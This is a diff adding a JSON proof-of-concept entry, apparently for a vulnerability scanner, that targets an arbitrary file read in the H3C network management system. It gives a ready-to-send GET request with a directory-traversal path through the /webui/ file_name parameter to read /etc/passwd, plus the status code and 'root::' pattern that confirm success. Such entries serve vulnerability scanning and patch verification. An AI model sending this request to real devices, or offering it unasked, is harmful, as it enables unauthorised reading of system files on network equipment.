@@ -1,0 +1,14 @@
+{
+	"name":"H3C网络管理系统任意文件读取",
+	"tag":"h3c",
+	"type":"other",
+	"poc":{
+		"pocGet":"/webui/?file_name=../../../../../etc/passwd&g=sys_dia_data_down",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Linux;",
+			"content-type":"text/plain"
+		},
+		"status_code":"200",
+		"pattern":"(root::)"
+	}
+}
